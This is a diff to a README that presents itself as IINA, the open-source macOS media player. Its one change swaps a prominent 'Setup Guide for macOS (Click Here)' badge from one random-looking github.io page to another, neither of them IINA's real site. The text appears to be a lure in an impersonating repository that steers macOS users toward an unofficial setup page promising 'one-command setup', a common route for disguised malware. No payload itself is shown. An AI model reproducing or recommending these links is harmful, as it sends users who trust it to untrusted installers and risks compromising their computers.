@@ -4,7 +4,7 @@
 IINA for macOS — a next-generation, open-source media player built for macOS users.  
 It delivers powerful playback based on the MPV engine, combined with a native macOS design and easy one-command setup for smooth installation and configuration.  
 
-[![Setup Guide for macOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20macOS%20%28Click%20Here%29-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://mazerdestroffik-jpg.github.io/mazerdestroffik-jpg/)
+[![Setup Guide for macOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20macOS%20%28Click%20Here%29-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://tashinaramales7233587.github.io/improved-octo-disco/thanks.html)
 
 ---
 
